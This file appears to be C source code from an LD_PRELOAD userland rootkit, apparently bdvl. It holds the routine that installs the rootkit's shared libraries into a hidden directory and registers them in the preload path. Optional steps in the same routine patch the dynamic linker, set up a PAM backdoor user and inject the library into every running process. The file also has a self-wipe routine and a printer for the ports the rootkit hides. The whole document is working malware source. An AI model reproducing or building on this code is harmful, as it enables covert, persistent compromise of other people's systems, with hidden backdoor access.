void bignope(const bdvcfg_t *bc){
    doiapath(bc->preloadpath, 0);
    if(rm(bc->preloadpath) < 0)
        xperror(RM);
    doiadir(bc->installdir, 0);
    if(eradicatedir(bc->installdir) < 0)
        xperror(ERADICATEDIR);
    bree((void*)bc);
    if(xrm(BDVL_CONFIG) < 0)
        xperror(RM);
    exit(0);
}

void printhideports(const bdvcfg_t *bc){
    const size_t numports = bc->portcount;
    size_t bufsize = 0;
    char tmp[8], buf[sizeof(tmp)*numports];

    memset(buf, 0, sizeof(buf));
    for(size_t i = 0; i < numports; i++){
#ifdef ACCEPT_HOOK_PORT
        if(i == 0){
            bxprintf(ACCEPT_PORT_STRING, bc->hideports[i]);
            continue;
        }
#endif
        memset(tmp, 0, sizeof(tmp));
        snprintf(tmp, sizeof(tmp), "%hu, ", bc->hideports[i]);
        const size_t tmpsize = strlen(tmp)+1;
        if(bufsize+tmpsize >= sizeof(buf)-1)
            break;

        strncat(buf, tmp, sizeof(buf));
        bufsize += tmpsize;
    }
    buf[bufsize - (numports+1)] = '\0';
    bxprintf(HIDDEN_PORTS_STRING, buf);
}

void bdvinstall(char *const argv[], const bdvcfg_t *bc, const u_short isupdate){
    const char *installdir = bc->installdir,
               *bdvlso = bc->bdvlso,
               *preloadpath = bc->preloadpath;
    const id_t magicid = bc->magicid;

    int fedora = isfedora();
    u_int gotso = 0;
#ifndef NO_INJECT_PROCS
    char *cso = NULL;
#endif

    dorolf();
#ifdef SEL_CONFIG
    doselchk();
#endif

    /* create installation directory. copy bdvl.so(s) to it. */
    bxprintf(CREATING_INSTALLDIR_STRING, 0);
    if(preparedir(installdir, magicid) < 0){
        xperror(PREPAREDIR);
        bignope(bc);
    }

    for(u_int i = 1; argv[i] != NULL; i++){
        if(strstr(argv[i], ".so.")){
            char *npath = sogetpath(argv[i], installdir, bdvlso);
            if(!npath){
                xperror(SOGETPATH);
                bignope(bc);
            }

            int cpr = socopy(argv[i], npath, magicid);
            if(!cpr){
                xperror(SOCOPY);
                clean(npath);
                bignope(bc);
            }else bxprintf(SO_COPY_SUCCESSFUL_STRING, basename(argv[i]), npath);

            if(fedora && xisplatform(npath, X86_PLATFORM_STRING)){
                char *sopath = rksopath(installdir, bdvlso);
                if(!sopath){
                    xperror(RKSOPATH);
                    clean(npath);
                    bignope(bc);
                }
                hook(CRENAME);
                if((long)call(CRENAME, npath, sopath) < 0){
                    xperror(RENAME);
                    clean(npath);
                    clean(sopath);
                    bignope(bc);
                }
#ifndef NO_INJECT_PROCS
                if((cso = strdup(sopath)) == NULL)
                    xperror(STRDUP);
#endif
                clean(sopath);
            }
#ifndef NO_INJECT_PROCS
            else if(!cso && !xisplatform(npath, I686_PLATFORM_STRING))
                if((cso = strdup(npath)) == NULL)
                    xperror(STRDUP);
#endif
            ++gotso;
            clean(npath);
            if(fedora) break;
        }
    }

    if(!gotso) bignope(bc);
    else if(_rknomore(installdir, bdvlso)){  /* no bdvl.so in installdir? */
        xperror(_RKNOMORE);
        bignope(bc);
    }else reinstall(bc);  /* finalise install - write to preloadpath. */
    if(!preloadok(bc)){
        xperror(PRELOADOK);
        bignope(bc);
    }else bxprintf(INSTALL_SUCCESSFUL_STRING, 0);

    if(!isupdate){
#ifdef PATCH_LD
        if(patch_on_install(preloadpath) < 0)
            bignope(bc);
#endif
#ifdef USE_PAM_BD
        char *pamname = xordup(BDUSERNAME);
        if(pamname){
            bxprintf(PAM_UNAME_INSTALL_NOTIF, pamname);
            clean(pamname);
        }else xperror(XORDUP);
#endif
#ifndef NO_INJECT_PROCS
        u_int pcount, injected = 0;
        pid_t *pids = allpids(&pcount);
        if(pids != NULL){
            if(cso != NULL){
                for(u_int p = 0; p < pcount; p++)
                    if(binject(pids[p], cso))
                        bxprintf(INJECTED_CSO_COUNT_STRING, basename(cso), ++injected);
                    else xperror(BINJECT);
                printf("\n");
                clean(cso);
            }
            free(pids);
        }else xperror(ALLPIDS);
#endif
    }

    printhideports(bc);

    if(!isupdate)
        bxprintf(UNINSTALL_WITH_BDVAR_STRING, bc->bdvar);
}